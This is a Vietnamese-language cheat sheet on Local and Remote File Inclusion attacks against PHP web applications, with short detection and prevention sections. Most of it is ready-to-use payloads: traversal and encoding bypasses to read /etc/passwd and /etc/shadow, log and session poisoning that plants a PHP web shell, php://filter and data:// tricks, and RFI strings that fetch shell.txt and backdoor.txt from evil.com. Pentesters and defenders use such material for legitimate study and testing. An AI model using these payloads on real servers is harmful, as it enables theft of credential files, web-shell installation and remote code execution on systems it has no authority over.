1. LFI & RFI là gì?

    LFI (Local File Inclusion):
    Attacker lợi dụng input của web app để truy xuất file local trên server (ví dụ: /etc/passwd, log, source code...).

    RFI (Remote File Inclusion):
    Attacker lợi dụng input để include file từ server khác (gửi về PHP để thực thi), dẫn đến RCE.

    Gặp nhiều nhất ở PHP (include, require, include_once, require_once), đôi khi có ở Java, ASP, JSP...

2. Nhận diện LFI/RFI – dấu hiệu thường gặp

    URL chứa tham số file/path, ví dụ:

    page.php?page=about.html
    index.php?file=contact
    view.php?template=header

    Có thể thay đổi giá trị param đó để thử truy xuất file bất kỳ.

3. Payload LFI cơ bản

    Truy xuất file hệ thống:

?page=/etc/passwd
?file=/etc/hosts
?file=/proc/self/environ
?file=../../../../../../etc/passwd

Bypass thư mục (directory traversal):

?file=....//....//....//etc/passwd
?file=..%2f..%2f..%2f..%2fetc/passwd
?file=..%252f..%252f..%252fetc/passwd
?file=..%c0%af..%c0%af..%c0%afetc/passwd

LFI với log injection:

    Đầu tiên, inject PHP code vào log (User-Agent, referer, v.v.):

<?php system($_GET['cmd']); ?>

Sau đó include file log:

        ?file=/var/log/apache2/access.log&cmd=id

        Nếu web sẽ include file log, code bạn chèn sẽ thực thi.

4. Payload RFI cơ bản

    Include file từ ngoài:

?file=http://evil.com/shell.txt
?file=//evil.com/shell.txt
?file=https://raw.githubusercontent.com/username/shell/master/shell.txt

RFI với các protocol khác:

    ?file=ftp://evil.com/backdoor.txt
    ?file=data://text/plain,<?php phpinfo(); ?>

    RFI hiện nay bị giảm mạnh vì PHP mặc định tắt allow_url_include, nhưng vẫn có thể gặp ở code legacy, custom.

5. Bypass filter và thực chiến LFI/RFI nâng cao
A. Bypass extension filter

    Nếu param kiểm tra .php, thử:

    ?file=../../../../etc/passwd%00
    ?file=../../../../etc/passwd%2500
    ?file=../../../../etc/passwd%00.jpg

    (payload %00 – null byte — không còn hiệu quả với PHP >=5.3, nhưng code custom hoặc các ngôn ngữ khác vẫn dính!)

B. Double encoding, unicode, etc.

```
?file=..%252f..%252f..%252fetc%252fpasswd
?file=..%c0%ae%c0%ae%2f..%c0%ae%c0%ae%2fetc%2fpasswd
```

C. Log poisoning (code injection qua log)

    Inject code vào User-Agent:

User-Agent: <?php system($_GET['cmd']); ?>

Truy cập log:

    ?file=/var/log/apache2/access.log&cmd=ls

D. LFI2RCE – Từ đọc file tới thực thi code

    Poisoning log (như trên)

    Read /proc/self/environ, inject shell qua User-Agent, rồi truy xuất /proc/self/environ để thực thi.

    LFI qua session file (PHP):

        Gửi request để tạo session có code độc (PHPSESSID=abc123).

        Include file session:

        ?file=/tmp/sess_abc123

        Shell sẽ thực thi khi file session được include.

E. Bypass filter extension

    Thử:

    ?file=php://filter/convert.base64-encode/resource=index.php

    Kết quả sẽ là base64 source code của file.
    Dùng để read source code khi server không cho download trực tiếp.

6. Các payload đặc biệt & protocol phụ trợ

    php://input – Nếu ứng dụng cho include file từ POST:

        Gửi POST data là shell code.

        Include:

    ?file=php://input

php://filter – Đọc source code:

?file=php://filter/read=convert.base64-encode/resource=index.php

data:// – Inject code trực tiếp:

    ?file=data://text/plain,<?php system($_GET['cmd']); ?>

7. Automation – tool hỗ trợ, scan hàng loạt

    wfuzz, ffuf: brute-force file, extension, bypass pattern

    dirsearch, gobuster: tìm file/dir ẩn, backup

    LFI Suite, LFISuite2: tự động hóa khai thác LFI

    Burp Suite Intruder: brute param với các payload ở trên.

8. Một số file local giá trị khi LFI trên Linux
File	Ý nghĩa
/etc/passwd	Liệt kê user
/etc/shadow	Hash mật khẩu (cần quyền root)
/etc/hosts	Bản đồ tên miền nội bộ
/var/log/apache2/access.log	Log web (inject shell)
/proc/self/environ	Biến môi trường (cookie, path, v.v.)
/proc/version	Version kernel
/proc/self/cmdline	Lệnh chạy webserver
9. Detection – làm sao nhận biết LFI/RFI

    Thử truy xuất các payload LFI đơn giản (etc/passwd) và xem phản hồi.

    Quan sát lỗi, stack trace, “No such file or directory”.

    Kết hợp automation (wfuzz/ffuf/burp).

    Xem log server nếu có alert, traceback, warning lạ.

10. Phòng chống LFI/RFI

    Luôn validate, sanitize input (white-list tên file, extension, không cho truyền path).

    Không bao giờ include file dựa trên input user, hoặc phải mapping cứng.

    Tắt các hàm nguy hiểm, protocol (allow_url_include = Off).

    Chạy webserver với user quyền hạn chế.

    Monitor log và alert khi có truy cập file lạ, pattern độc.

11. Payload mẫu (thực chiến) tổng hợp

Directory traversal:

../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%afetc%2fpasswd

Extension bypass:

../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

php://filter:

php://filter/convert.base64-encode/resource=index.php

Log Poisoning:

/var/log/apache2/access.log
/proc/self/environ
/tmp/sess_<PHPSESSID>

RFI:

http://evil.com/shell.txt
ftp://evil.com/backdoor.txt
data://text/plain,<?php echo system($_GET['cmd']); ?>

12. Tài liệu, link hữu ích

    PayloadAllTheThings LFI

    HackTricks LFI

    OWASP LFI

    PentesterLab LFI exercises

    LFI Suite

Tóm tắt nhanh

    LFI/RFI là bug cực nguy hiểm, dễ xuất hiện ở web PHP và các framework xử lý file động.

    Payload đa dạng, luôn thử directory traversal, extension bypass, protocol đặc biệt, log/session poisoning.

    Có thể dẫn tới RCE nếu kết hợp với bug khác (file upload, log poisoning...).

    Luôn kiểm tra kỹ input, filter trắng đen, không bao giờ include input user trực tiếp!